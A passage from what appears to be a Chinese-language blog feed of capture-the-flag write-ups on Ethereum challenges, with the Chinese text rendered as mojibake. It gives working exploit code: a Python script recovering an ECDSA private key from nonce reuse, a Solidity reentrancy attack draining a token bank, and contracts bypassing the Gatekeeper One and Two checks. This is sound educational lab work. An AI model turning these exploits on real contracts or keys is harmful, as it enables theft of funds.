class="hljs-symbol">z2</span>)/(<span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span>)<br><br>æ‰€ä»¥ç§é’¥ d = (s*k-z)/r<br>= (s*k-z) * inverse_mod(r, p) % p<br><br>k = (<span class="hljs-symbol">z1</span>-<span class="hljs-symbol">z2</span>)/(<span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span>)<br>= (<span class="hljs-symbol">z1</span> â€“ <span class="hljs-symbol">z2</span>)*inverse_mod(<span class="hljs-symbol">s1</span> â€“ <span class="hljs-symbol">s2</span>,p)%p<br></code></pre></td></tr></table></figure><p>å…¶ä¸­å–æ¨¡åçš„è¿ç®—æ¥è‡ªäº<a href="https://github.com/warner/python-ecdsa/">python-ecdsa</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inverse_mod</span>(<span class="hljs-params"> a, m </span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Inverse of a mod m.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> m &lt;= a: a = a % m<br>    c, d = a, m<br>    uc, vc, ud, vd = <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> c != <span class="hljs-number">0</span>:<br>        q, c, d = <span class="hljs-built_in">divmod</span>( d, c ) + ( c, )<br>        uc, vc, ud, vd = ud - q*uc, vd - q*vc, uc, vc<br><br>    <span class="hljs-keyword">assert</span> d == <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> ud &gt; <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> ud<br>    <span class="hljs-keyword">else</span>: <span class="hljs-keyword">return</span> ud + m<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">derivate_privkey</span>(<span class="hljs-params">p, r, s1, s2, z1, z2</span>):</span><br>    z = z1 - z2<br>    s = s1 - s2<br>    r_inv = inverse_mod(r, p)<br>    s_inv = inverse_mod(s, p)<br>    k = (z * s_inv) % p<br>    d = (r_inv * (s1 * k - z1)) % p<br>    <span class="hljs-keyword">return</span> d, k<br><br>z1 = <span class="hljs-number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span><br>s1 = <span class="hljs-number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span><br>r = <span class="hljs-number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span><br>z2 = <span class="hljs-number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span><br>s2 = <span class="hljs-number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span><br><br>p  = <span class="hljs-number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;privatekey:%x\n k:%x&quot;</span> % derivate_privkey(p,r,s1,s2,z1,z2))<br></code></pre></td></tr></table></figure><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AssumeOwnershipChallenge &#123;<br>    address owner;<br>    bool public isComplete;<br><br>    function AssumeOwmershipChallenge() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°æ‹¼å†™é”™è¯¯</p><h3 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;<br>    require(balanceOf[msg.sender] &gt;= value);<br><br>    balanceOf[msg.sender] -= value;<br>    balanceOf[to] += value;<br>    emit Transfer(msg.sender, to, value);<br><br>    if (isContract(to)) &#123;<br>        ITokenReceiver(to).tokenFallback(msg.sender, value, data);<br>    &#125;<br>    return true;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ¤æ–­äº†toåœ°å€æ˜¯å¦æ˜¯ä¸ªåˆçº¦åœ°å€ï¼Œå¦‚æœæ˜¯åˆçº¦çš„è¯å°±ç”¨ITokenReceiveræ¥å£æ¥è°ƒç”¨toåˆçº¦çš„tokenFallbackå‡½æ•°ï¼Œåœ¨é“¶è¡Œåˆçº¦é‡Œè¿™ä¸ªå‡½æ•°ç”¨æ›´æ”¹ç›®æ ‡çš„balanceï¼Œåˆçº¦å­˜åœ¨é‡å…¥æ¼æ´ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint256 amount) public &#123;<br>    require(balanceOf[msg.sender] &gt;= amount);<br><br>    require(token.transfer(msg.sender, amount));<br>    // balance decreased after recipient is notified<br>    // re-entrancy issue<br>    balanceOf[msg.sender] -= amount;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨è¯¥<code>token.transfer</code>å‡½æ•°åä½™é¢ä¼šæ›´æ–°ï¼Œå…è®¸æˆ‘ä»¬æ¯æ¬¡é‡å¤æå–æˆ‘ä»¬çš„å­˜å…¥èµ„é‡‘ã€‚é‡å…¥æ§åˆ¶æµç¨‹å°†æ˜¯<code>challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; ... </code>ã€‚</p><p>åœ¨è°ƒç”¨æ”»å‡»åˆçº¦å‰ï¼Œå…ˆå°†playerè´¦æˆ·withdrawå‡ºæ¥ï¼Œå†ç»™æ”»å‡»åˆçº¦æˆæƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    TokenBankChallenge public challenge;<br><br>    constructor(address challengeAddress) &#123;<br>        challenge = TokenBankChallenge(challengeAddress);<br>    &#125;<br><br>    function deposit() payable &#123;<br>        challenge.token().transferFrom(address(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624),address(this),500000000000000000000000);<br>        challenge.token().transfer(address(challenge),challenge.token().balanceOf(address(this)));<br>    &#125;<br><br>    function attack() payable &#123;<br>        callWithdraw();<br>        require(challenge.isComplete(), &quot;challenge not completed&quot;);<br>    &#125;<br><br>    function tokenFallback(address from, uint256 value, bytes data) external &#123;<br>        callWithdraw();<br>    &#125;<br><br>    function callWithdraw() payable &#123;<br>        uint256 myInitialBalance = 500000000000000000000000;<br>        uint256 challengeTotalRemainingBalance =<br>            challenge.token().balanceOf(address(challenge));<br>        bool keepRecursing = challengeTotalRemainingBalance &gt; 0;<br><br>        if (keepRecursing) &#123;<br>            uint256 toWithdraw =<br>                myInitialBalance &lt; challengeTotalRemainingBalance<br>                    ? myInitialBalance<br>                    : challengeTotalRemainingBalance;<br>            challenge.withdraw(toWithdraw);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœºåˆ·é¢˜</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Ethernaut Part â…¡</title>
    <link href="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ethernaut.zeppelin.solutions/">å¹³å°åœ°å€</a></p><h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13. Gatekeeper One"></a>13. Gatekeeper One</h2><h3 id="é—¯å…³è¦æ±‚"><a href="#é—¯å…³è¦æ±‚" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¶Šè¿‡å®ˆé—¨äººå¹¶ä¸”æ³¨å†Œä¸ºä¸€ä¸ªå‚èµ›è€…æ¥å®Œæˆè¿™ä¸€å…³.</p><h3 id="åˆçº¦ä»£ç "><a href="#åˆçº¦ä»£ç " class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract GatekeeperOne &#123;<br><br>  using SafeMath for uint256;<br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(gasleft().mod(8191) == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);<br>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);<br>      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ"><a href="#åˆçº¦åˆ†æ" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p><strong>gateOne</strong>ï¼Œé€šè¿‡å¦ä¸€ä¸ªåˆçº¦è°ƒç”¨å³å¯</p><p><strong>gateTwo</strong>ï¼Œéœ€è¦æ»¡è¶³ <code>gasleft() % 8191 == 0</code></p><p>å…ˆå¯¹åˆçº¦è¿›è¡Œdebugï¼Œå°†ç‡ƒæ–™é™åˆ¶è°ƒåˆ°999999</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225195749000.png" alt="image-20220225195749000"></p><p>attackåï¼Œå»etherscanä¸­çœ‹ä¸€ä¸‹<code>debug trace</code></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225195945938.png" alt="image-20220225195945938"></p><p>å› ä¸ºç¬¬äºŒä¸ªæ¡ä»¶æ‰§è¡Œäº†<code>gasleft()</code>ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸‹Gasæ“ä½œï¼šè·å–å‰©ä½™å¯æ‰§è¡Œç‡ƒæ–™æ•°</p><p>ç”±äºGasæœ¬èº«çš„æ“ä½œä¹Ÿæ˜¯æ¶ˆè€—ç‡ƒæ°”çš„ï¼Œæ‰€ä»¥958082æ‰æ˜¯gasæ“ä½œè·å¾—çš„å‰©ä½™å¯æ‰§è¡Œç‡ƒæ°”æ•°</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225200853744.png" alt="image-20220225200853744"></p><p>958082%8191=7926</p><p>999999-7926=992073</p><p>å†å°†ç‡ƒæ–™é™åˆ¶è°ƒåˆ°992073</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225203159579.png" alt="image-20220225203159579"></p><p>950280%8191=124</p><p>992073-124=991949</p><p>å†å°†ç‡ƒæ–™é™åˆ¶è°ƒåˆ°991949</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225203636903.png" alt="image-20220225203636903"></p><p>950158%8191=2</p><p>991949-2=991947</p><p>å†å°†ç‡ƒæ–™é™åˆ¶è°ƒåˆ°991947</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225203940798.png" alt="image-20220225203940798"></p><p>æ­¤æ—¶å·²ç»æ²¡æœ‰revert</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225204101240.png" alt="image-20220225204101240"></p><p>ä¸”950156%8191=0</p><p><strong>gateThree</strong>ï¼Œå…ˆäº†è§£ä¸€ä¸‹ Solidity çš„ç±»å‹è½¬æ¢è§„åˆ™</p><p>è½¬æ¢æˆæ›´å°çš„ç±»å‹ï¼Œä¼šä¸¢å¤±é«˜ä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint32 a = 0x12345678;<br>uint16 b = uint16(a); // b = 0x5678<br></code></pre></td></tr></table></figure><p>è½¬æ¢æˆæ›´å¤§çš„ç±»å‹ï¼Œå°†å‘å·¦ä¾§æ·»åŠ å¡«å……ä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint16 a = 0x1234;<br>uint32 b = uint32(a); // b = 0x00001234 <br></code></pre></td></tr></table></figure><p>è½¬æ¢åˆ°æ›´å°çš„å­—èŠ‚ç±»å‹ï¼Œä¼šä¸¢å¤±åé¢æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes2 a = 0x1234;<br>bytes1 b = bytes1(a); // b = 0x12<br></code></pre></td></tr></table></figure><p>è½¬æ¢ä¸ºæ›´å¤§çš„å­—èŠ‚ç±»å‹æ—¶ï¼Œå‘å³æ·»åŠ å¡«å……ä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes2 a = 0x1234;<br>bytes4 b = bytes4(a); // b = 0x12340000<br></code></pre></td></tr></table></figure><p>åªæœ‰å½“å­—èŠ‚ç±»å‹å’Œintç±»å‹å¤§å°ç›¸åŒæ—¶ï¼Œæ‰å¯ä»¥è¿›è¡Œè½¬æ¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes2 a = 0x1234;<br>uint32 b = uint16(a); // b = 0x00001234<br>uint32 c = uint32(bytes4(a)); // c = 0x12340000<br>uint8 d = uint8(uint16(a)); // d = 0x34<br>uint8 e = uint8(bytes1(a)); // e = 0x12<br></code></pre></td></tr></table></figure><p>æŠŠæ•´æ•°èµ‹å€¼ç»™æ•´å‹æ—¶ï¼Œä¸èƒ½è¶…å‡ºèŒƒå›´ï¼Œå‘ç”Ÿæˆªæ–­ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint8 a = 12; // no error<br>uint32 b = 1234; // no error<br>uint16 c = 0x123456; // error, æœ‰æˆªæ–­ï¼Œå˜ä¸º 0x3456<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿä»£ç ï¼Œå¾—å‡ºå¯ä»¥é€šè¿‡ <code>bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF</code> å®ç°</p><h3 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;<br><br>contract GatekeeperOne &#123;<br><br>  using SafeMath for uint256;<br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(gasleft().mod(8191) == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);<br>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);<br>      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address instance_add = 0x3fADc7E018F9b0236f82132B0569e7c4363622f0;<br>    GatekeeperOne gatekeeperOne = GatekeeperOne(instance_add);<br><br>    function attack() public &#123;<br>        bytes8 gateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF;<br>        //gatekeeperOne.enter&#123;gas: 999999&#125;(gateKey);<br>        address(gatekeeperOne).call.gas(999999)(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, gateKey));<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨debugè°ƒè¯•è‡³æ²¡æœ‰revertåï¼Œå›åˆ°ethernautä¸­ä½¿ç”¨å‘½ä»¤ <code>await contract.entrant()</code> ï¼Œå‘ç°ç»“æœæ˜¯è‡ªå·±çš„åœ°å€</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225204358089.png" alt="image-20220225204358089"></p><p>æäº¤å®ä¾‹</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220225204533099.png" alt="image-20220225204533099"></p><h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14. Gatekeeper Two"></a>14. Gatekeeper Two</h2><h3 id="é—¯å…³è¦æ±‚-1"><a href="#é—¯å…³è¦æ±‚-1" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¿™ä¸ªå®ˆé—¨äººå¸¦æ¥äº†ä¸€äº›æ–°çš„æŒ‘æˆ˜, åŒæ ·çš„éœ€è¦æ³¨å†Œä¸ºå‚èµ›è€…æ¥å®Œæˆè¿™ä¸€å…³</p><h3 id="åˆçº¦ä»£ç -1"><a href="#åˆçº¦ä»£ç -1" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-1"><a href="#åˆçº¦åˆ†æ-1" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p><strong>gateOne</strong>ï¼Œä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦è°ƒç”¨å³å¯</p><p><strong>gateTwo</strong>ï¼Œä½¿ç”¨äº†<a href="https://www.tryblockchain.org/blockchain-solidity-assembly.html">å†…è”æ±‡ç¼–</a></p><p>extcodesize ç”¨æ¥è·å–æŒ‡å®šåœ°å€çš„åˆçº¦ä»£ç å¤§å°ã€‚è¿™é‡Œä½¿ç”¨çš„æ˜¯å†…è”æ±‡ç¼–æ¥è·å–è°ƒç”¨æ–¹(caller)çš„ä»£ç å¤§å°ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå½“callerä¸ºåˆçº¦æ—¶ï¼Œè·å–çš„å¤§å°ä¸ºåˆçº¦å­—èŠ‚ç å¤§å°,callerä¸ºè´¦æˆ·æ—¶ï¼Œè·å–çš„å¤§å°ä¸º 0 ã€‚æ¡ä»¶ä¸ºè°ƒç”¨æ–¹ä»£ç å¤§å°ä¸º0 ï¼Œç”±äºåˆçº¦åœ¨åˆå§‹åŒ–ï¼Œä»£ç å¤§å°ä¸º0ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æŠŠæ”»å‡»åˆçº¦çš„è°ƒç”¨æ“ä½œå†™åœ¨ constructor æ„é€ å‡½æ•°ä¸­ã€‚</p><p><strong>gateThree</strong>ï¼Œå¼‚æˆ–çš„ç‰¹æ€§å°±æ˜¯å¼‚æˆ–ä¸¤æ¬¡å°±æ˜¯åŸæ•°æ®ã€‚æ‰€ä»¥å°†senderå’ŒFFFFFFFFFFFFFFFFè¿›è¡Œå¼‚æˆ–çš„å€¼å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚</p><h3 id="æ”»å‡»æµç¨‹-1"><a href="#æ”»å‡»æµç¨‹-1" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    constructor(address instance_add) public &#123;<br>        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(instance_add);<br>        //bytes8 gateKey = bytes8(uint64(address(this)) ^ (uint64(0) - 1)); æ­¤å¤„æ²¡æœ‰ä½¿ç”¨keccak256æ‰€ä»¥å¤±è´¥äº†<br>        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this))))^(uint64(0) - 1));<br>        //gatekeeperTwo.enter(gateKey);<br>        address(gatekeeperTwo).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, gateKey));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220226142319439.png" alt="image-20220226142319439"></p><p><img 